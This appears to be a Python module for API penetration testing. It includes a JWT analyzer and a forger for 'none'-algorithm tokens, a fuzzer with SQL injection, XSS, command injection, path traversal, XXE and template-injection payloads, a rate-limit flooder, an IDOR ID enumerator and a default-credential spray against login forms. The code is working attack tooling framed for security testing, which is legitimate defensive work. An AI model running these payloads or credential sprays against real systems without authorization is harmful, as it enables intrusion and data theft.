"""API Security Testing module — JWT, fuzzer, rate-limit, Swagger, IDOR, broken auth."""
import re, json, base64, time, hashlib
from datetime import datetime

try:
    import requests as req
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    req.packages.urllib3.disable_warnings(InsecureRequestWarning)
    REQ_OK = True
except ImportError:
    REQ_OK = False

try:
    import jwt as pyjwt
    JWT_LIB = True
except ImportError:
    JWT_LIB = False


# ── JWT Analyzer ─────────────────────────────────────────────────────────────
def jwt_analyze(token: str) -> dict:
    result = {"token": token[:20]+"…", "timestamp": datetime.utcnow().isoformat(),
              "valid_format": False, "vulnerabilities": [], "info": {}}
    token = token.strip()
    if token.startswith("Bearer "):
        token = token[7:]
    parts = token.split(".")
    if len(parts) != 3:
        result["error"] = "Not a valid JWT — must have 3 parts separated by dots"
        return result
    result["valid_format"] = True
    try:
        def b64d(s):
            s += "=" * (-len(s) % 4)
            return json.loads(base64.urlsafe_b64decode(s))
        header  = b64d(parts[0])
        payload = b64d(parts[1])
        result["header"]  = header
        result["payload"] = payload
        # Algorithm checks
        alg = header.get("alg","").upper()
        result["info"]["algorithm"] = alg
        if alg == "NONE":
            result["vulnerabilities"].append({
                "type": "Algorithm 'none' — No Signature Verification",
                "severity": "CRITICAL",
                "description": "JWT uses 'none' algorithm — completely unsigned, trivially forgeable.",
                "poc": f"{parts[0]}.{parts[1]}.",
                "remediation": "Reject JWTs with alg=none server-side.",
            })
        elif alg in ("RS256","RS384","RS512","ES256","ES384","ES512"):
            result["vulnerabilities"].append({
                "type": "Potential Algorithm Confusion (RS→HS)",
                "severity": "HIGH",
                "description": "If server accepts HS256, attacker can sign with public key as HMAC secret.",
                "poc": "Forge token using HS256 with server's RSA public key as HMAC secret",
                "remediation": "Enforce expected algorithm server-side. Never auto-detect algorithm.",
            })
        elif alg in ("HS256","HS384","HS512"):
            result["info"]["alg_note"] = "HMAC — verify secret strength"
        # Expiry check
        exp = payload.get("exp")
        iat = payload.get("iat")
        nbf = payload.get("nbf")
        if exp:
            import time as t
            remaining = exp - t.time()
            result["info"]["expires_in_seconds"] = int(remaining)
            if remaining < 0:
                result["vulnerabilities"].append({
                    "type": "Expired Token",
                    "severity": "MEDIUM",
                    "description": f"Token expired {abs(int(remaining))}s ago",
                    "remediation": "Verify token expiry server-side and reject expired tokens.",
                })
        else:
            result["vulnerabilities"].append({
                "type": "No Expiry (exp) Claim",
                "severity": "HIGH",
                "description": "Token has no expiry — it never expires, enabling session persistence after logout.",
                "remediation": "Always include exp claim. Implement token revocation.",
            })
        # Sensitive data in payload
        sensitive = ["password","passwd","secret","ssn","credit","card","cvv","pin","dob"]
        for k, v in payload.items():
            if any(s in k.lower() for s in sensitive):
                result["vulnerabilities"].append({
                    "type": f"Sensitive Data in Payload: {k}",
                    "severity": "HIGH",
                    "description": "JWT payload is base64-encoded, not encrypted — visible to anyone with the token.",
                    "remediation": "Never store sensitive data in JWT payload. Use JWE for encrypted tokens.",
                })
        # Weak secret brute force hints
        if alg.startswith("HS"):
            result["info"]["brute_force_hint"] = (
                f"hashcat -a 0 -m 16500 '{token}' /path/to/wordlist.txt")
        # kid injection
        kid = header.get("kid","")
        if kid:
            result["info"]["kid"] = kid
            if any(c in kid for c in ["'",'"',"--",";"]):
                result["vulnerabilities"].append({
                    "type": "JWT kid SQL/Path Injection",
                    "severity": "CRITICAL",
                    "description": f"kid parameter contains suspicious chars: {kid}",
                    "remediation": "Sanitise kid parameter. Use whitelisted key IDs.",
                })
        result["info"]["claims"] = list(payload.keys())
    except Exception as e:
        result["error"] = str(e)
    return result


def jwt_forge_none(token: str) -> dict:
    """Generate none-algorithm forged token."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return {"error": "Invalid JWT"}
    try:
        def b64d(s):
            s += "=" * (-len(s) % 4)
            return json.loads(base64.urlsafe_b64decode(s))
        header  = b64d(parts[0])
        payload = b64d(parts[1])
        header["alg"] = "none"
        def b64e(d):
            return base64.urlsafe_b64encode(json.dumps(d, separators=(",",":")).encode()).rstrip(b"=").decode()
        forged = f"{b64e(header)}.{b64e(payload)}."
        return {"forged_token": forged, "note": "Test if server accepts this unsigned token"}
    except Exception as e:
        return {"error": str(e)}


# ── API Fuzzer ────────────────────────────────────────────────────────────────
FUZZ_PAYLOADS = {
    "sqli":   ["'","''","' OR '1'='1","1' OR 1=1--","'; DROP TABLE users--",
               "1 AND 1=1","1 AND 1=2","' UNION SELECT NULL--"],
    "xss":    ["<script>alert(1)</script>","<img src=x onerror=alert(1)>",
               "'\"><svg onload=alert(1)>","javascript:alert(1)"],
    "cmd":    [";id","|id","&&id","$(id)","`id`",";sleep 5","|whoami"],
    "lfi":    ["../../../etc/passwd","..%2F..%2F..%2Fetc%2Fpasswd",
               "....//....//etc/passwd","/etc/passwd"],
    "xxe":    ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'],
    "ssti":   ["{{7*7}}","${7*7}","<%= 7*7 %>","#{7*7}"],
    "format": ["%s%s%s%s","%d%d%d%d","%x%x%x%x","AAAA"*100],
}

def fuzz_endpoint(base_url: str, method: str = "GET", params: dict = None,
                  fuzz_types: list = None) -> dict:
    result = {"url": base_url, "method": method,
              "vulnerabilities": [], "info": [],
              "timestamp": datetime.utcnow().isoformat()}
    if not REQ_OK:
        return {"error": "requests not installed"}
    if not params:
        # Extract params from URL
        qs = base_url.split("?",1)[-1] if "?" in base_url else ""
        params = {k: v for k, v in [p.split("=",1) for p in qs.split("&") if "=" in p]}
    if not params:
        params = {"id": "1", "q": "test", "search": "test", "input": "test"}
    if not fuzz_types:
        fuzz_types = ["sqli","xss","cmd","ssti"]
    session = req.Session()
    session.verify = False
    for param, orig_val in list(params.items())[:3]:
        for ftype in fuzz_types:
            for payload in FUZZ_PAYLOADS.get(ftype,[])[:3]:
                test_params = {**params, param: payload}
                try:
                    if method.upper() == "GET":
                        r = session.get(base_url.split("?")[0], params=test_params, timeout=6)
                    else:
                        r = session.post(base_url.split("?")[0], data=test_params, timeout=6)
                    body_lower = r.text.lower()
                    found = _detect_fuzz_hit(ftype, payload, body_lower, r.status_code)
                    if found:
                        result["vulnerabilities"].append({
                            "type": ftype.upper(), "parameter": param, "payload": payload,
                            "evidence": found, "status_code": r.status_code,
                            "severity": {"sqli":"CRITICAL","cmd":"CRITICAL","xxe":"CRITICAL",
                                         "lfi":"CRITICAL","ssti":"CRITICAL","xss":"HIGH",
                                         "format":"MEDIUM"}.get(ftype,"MEDIUM"),
                        })
                except Exception as e:
                    result["info"].append(f"Error on {param}={payload}: {e}")
    result["total_vulns"] = len(result["vulnerabilities"])
    return result


def _detect_fuzz_hit(ftype, payload, body_lower, status):
    if ftype == "sqli":
        errors = ["sql syntax","mysql_fetch","you have an error in your sql","ora-","unclosed quotation"]
        for e in errors:
            if e in body_lower: return f"SQL error: {e}"
    elif ftype == "xss":
        if payload.lower() in body_lower: return "Payload reflected in response"
    elif ftype == "cmd":
        for ind in ["uid=","root","www-data","daemon"]:
            if ind in body_lower: return f"Command output: {ind}"
    elif ftype == "lfi":
        for ind in ["root:x:","daemon:","[extensions]"]:
            if ind in body_lower: return f"File content: {ind}"
    elif ftype == "ssti":
        if "49" in body_lower: return "Math evaluated: {{7*7}}=49"
    return None


# ── Rate limit tester ─────────────────────────────────────────────────────────
def rate_limit_test(url: str, requests_count: int = 30, method: str = "GET",
                    body: dict = None) -> dict:
    result = {"url": url, "timestamp": datetime.utcnow().isoformat(),
              "responses": [], "rate_limited": False, "vulnerable": False}
    if not REQ_OK:
        return {"error": "requests not installed"}
    requests_count = min(requests_count, 50)
    status_codes   = []
    headers_seen   = set()
    session = req.Session(); session.verify = False
    start = time.time()
    for i in range(requests_count):
        try:
            if method.upper() == "POST":
                r = session.post(url, json=body or {}, timeout=5)
            else:
                r = session.get(url, timeout=5)
            status_codes.append(r.status_code)
            # Check rate limit headers
            for h in ["X-RateLimit-Limit","X-RateLimit-Remaining","Retry-After",
                      "X-Rate-Limit-Limit","RateLimit-Limit","RateLimit-Remaining"]:
                if h.lower() in {k.lower() for k in r.headers}:
                    headers_seen.add(h)
        except Exception:
            status_codes.append(0)
    elapsed = time.time() - start
    result["total_requests"]  = requests_count
    result["elapsed_seconds"] = round(elapsed, 2)
    result["rps"]             = round(requests_count / elapsed, 1)
    result["status_codes"]    = {str(c): status_codes.count(c) for c in set(status_codes)}
    result["rate_limit_headers"] = list(headers_seen)
    result["rate_limited"] = any(c in (429, 503) for c in status_codes[-10:])
    result["vulnerable"]   = not result["rate_limited"] and not headers_seen
    if result["vulnerable"]:
        result["finding"] = {
            "type": "No Rate Limiting Detected",
            "severity": "HIGH",
            "description": f"Sent {requests_count} requests in {elapsed:.1f}s with no rate limiting or throttling detected.",
            "remediation": "Implement rate limiting (e.g., 100 req/min per IP). Use tools like nginx limit_req or WAF.",
        }
    return result


# ── Swagger / OpenAPI parser ──────────────────────────────────────────────────
def parse_swagger(swagger_text: str) -> dict:
    result = {"endpoints": [], "auth_schemes": [], "servers": [],
              "vulnerabilities": [], "timestamp": datetime.utcnow().isoformat()}
    try:
        if swagger_text.strip().startswith("{"):
            spec = json.loads(swagger_text)
        else:
            import yaml
            spec = yaml.safe_load(swagger_text)
    except Exception:
        # Try basic JSON
        try:
            spec = json.loads(swagger_text)
        except Exception as e:
            return {"error": f"Could not parse Swagger/OpenAPI: {e}"}
    result["info"] = spec.get("info",{})
    result["version"] = spec.get("openapi") or spec.get("swagger","")
    # Servers
    for s in spec.get("servers",[]):
        result["servers"].append(s.get("url",""))
    # Security schemes
    components = spec.get("components", spec.get("securityDefinitions",{}))
    if "securitySchemes" in components:
        for name, scheme in components["securitySchemes"].items():
            result["auth_schemes"].append({"name":name,"type":scheme.get("type",""),
                                           "scheme":scheme.get("scheme",""),
                                           "in":scheme.get("in","")})
    # Endpoints
    paths = spec.get("paths",{})
    for path, methods in paths.items():
        for method, details in methods.items():
            if method.upper() in ("GET","POST","PUT","DELETE","PATCH","OPTIONS","HEAD"):
                ep = {
                    "path":       path,
                    "method":     method.upper(),
                    "summary":    details.get("summary",""),
                    "tags":       details.get("tags",[]),
                    "security":   details.get("security"),
                    "parameters": [p.get("name") for p in details.get("parameters",[])],
                }
                result["endpoints"].append(ep)
                # Security checks
                if ep["security"] is None and not spec.get("security"):
                    result["vulnerabilities"].append({
                        "type": f"Unauthenticated Endpoint: {method.upper()} {path}",
                        "severity": "HIGH" if method.upper() in ("POST","PUT","DELETE","PATCH") else "MEDIUM",
                        "description": "Endpoint has no security scheme defined.",
                        "remediation": "Add security requirement to endpoint or global security.",
                    })
                if "admin" in path.lower() or "internal" in path.lower():
                    result["vulnerabilities"].append({
                        "type": f"Sensitive Path Exposed in Spec: {path}",
                        "severity": "MEDIUM",
                        "description": "Admin/internal endpoint documented in public API spec.",
                        "remediation": "Remove sensitive endpoints from public API documentation.",
                    })
    result["total_endpoints"] = len(result["endpoints"])
    return result


# ── IDOR tester ───────────────────────────────────────────────────────────────
def idor_test(base_url: str, param: str = "id", start: int = 1,
              count: int = 10, token: str = "") -> dict:
    result = {"url": base_url, "param": param,
              "findings": [], "timestamp": datetime.utcnow().isoformat()}
    if not REQ_OK:
        return {"error": "requests not installed"}
    session = req.Session(); session.verify = False
    if token:
        session.headers["Authorization"] = f"Bearer {token}"
    baseline_url = f"{base_url}?{param}={start}"
    try:
        baseline = session.get(baseline_url, timeout=6)
        baseline_status = baseline.status_code
        baseline_size   = len(baseline.content)
    except Exception as e:
        return {"error": str(e)}
    for i in range(start, start + min(count, 20)):
        test_url = f"{base_url}?{param}={i}"
        try:
            r = session.get(test_url, timeout=5)
            if r.status_code == 200 and len(r.content) > 50:
                diff = abs(len(r.content) - baseline_size)
                result["findings"].append({
                    "id":      i,
                    "status":  r.status_code,
                    "size":    len(r.content),
                    "diff":    diff,
                    "url":     test_url,
                    "note":    "Accessible" if r.status_code == 200 else "Error",
                })
        except Exception:
            pass
    # Horizontal privilege escalation check (different sizes = different user data)
    sizes = [f["size"] for f in result["findings"]]
    if len(set(sizes)) > 1:
        result["vulnerability"] = {
            "type": "Potential IDOR — Different Responses for Different IDs",
            "severity": "HIGH",
            "description": f"IDs {start}-{start+count} return varying responses, suggesting IDOR.",
            "remediation": "Enforce server-side object-level authorization (IDOR check).",
        }
    return result


# ── Broken auth tester ────────────────────────────────────────────────────────
def broken_auth_test(login_url: str, username_field: str = "username",
                     password_field: str = "password") -> dict:
    result = {"url": login_url, "timestamp": datetime.utcnow().isoformat(),
              "vulnerabilities": [], "info": []}
    if not REQ_OK:
        return {"error": "requests not installed"}
    session = req.Session(); session.verify = False
    # Default credential spray
    defaults = [("admin","admin"),("admin","password"),("admin","admin123"),
                ("root","root"),("test","test"),("admin",""),("guest","guest"),
                ("admin","letmein"),("admin","1234"),("user","password")]
    successful = []
    for uname, passwd in defaults:
        try:
            r = session.post(login_url, data={username_field: uname, password_field: passwd},
                             timeout=5, allow_redirects=True)
            if r.status_code in (200, 302):
                body = r.text.lower()
                failed_indicators = ["invalid","incorrect","wrong","failed","error",
                                     "invalid credentials","authentication failed"]
                success_indicators = ["logout","dashboard","welcome","profile","account"]
                if any(ind in body for ind in success_indicators) and \
                   not any(ind in body for ind in failed_indicators):
                    successful.append({"username": uname, "password": passwd,
                                       "status": r.status_code})
        except Exception:
            pass
    if successful:
        result["vulnerabilities"].append({
            "type": "Default Credentials Active",
            "severity": "CRITICAL",
            "credentials": successful,
            "remediation": "Change all default credentials immediately.",
        })
    # Account enumeration check
    try:
        r1 = session.post(login_url, data={username_field:"admin_doesnotexist",
                                            password_field:"wrong"}, timeout=5)
        r2 = session.post(login_url, data={username_field:"admin",
                                            password_field:"wrong"}, timeout=5)
        if r1.text != r2.text or r1.status_code != r2.status_code:
            result["vulnerabilities"].append({
                "type": "Username Enumeration",
                "severity": "MEDIUM",
                "description": "Different responses for valid vs invalid usernames.",
                "remediation": "Return identical responses for failed login regardless of username validity.",
            })
    except Exception:
        pass
    return result
